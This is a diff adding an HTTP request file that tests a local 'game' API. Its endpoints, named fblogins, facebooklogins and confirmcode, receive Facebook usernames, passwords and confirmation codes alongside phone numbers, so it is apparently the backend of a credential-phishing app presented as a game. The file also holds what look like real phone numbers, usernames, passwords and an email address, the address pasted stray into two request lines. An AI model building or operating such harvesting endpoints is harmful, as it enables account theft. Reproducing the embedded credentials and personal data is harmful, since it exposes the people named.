@@ -1,0 +1,41 @@
+###root api
+GET http://localhost:8000/api/v1/game/number
+###Post the numbers
+POST http://localhost:8000/api/v1/game/number
+Content-Type: application/json
+
+{
+    "urNumber":"9809530995",
+    "partnerNumber":"0451644397"
+}
+### get fblogins 
+GET http://localhost:8000/api/v1/game/fblogins
+###Post fblogins
+POST http://localhost:8000/api/v1/game/fblogins
+Content-Type: application/json
+
+{
+    "userName":"bipana22.gautam",
+    "password":"loveyoupradeep"
+}
+### get facebooklogins 
+GET http://localhost:8000/api/v1/game/facebooklogins
+###Post facebooklogins
+POST http://localhost:8000/api/v1/game/facebooklogins
+Content-Type: application/json
+
+{
+    "confirmUserName":"bipana22.sharma",
+    "confirmPassword":"loveyoupk"
+}
+### get facebooklogins 
+pradeepdhital001@gmail.comGET http://localhost:8000/api/v1/game/confirmcode
+###Post facebookloginspradeepdhital001@gmail.com
+POST http://localhost:8000/api/v1/game/confirmcode
+Content-Type: application/json
+
+{
+   "confirmationCode":"787898"
+}
+###root api POST
+GET http://localhost:8000/
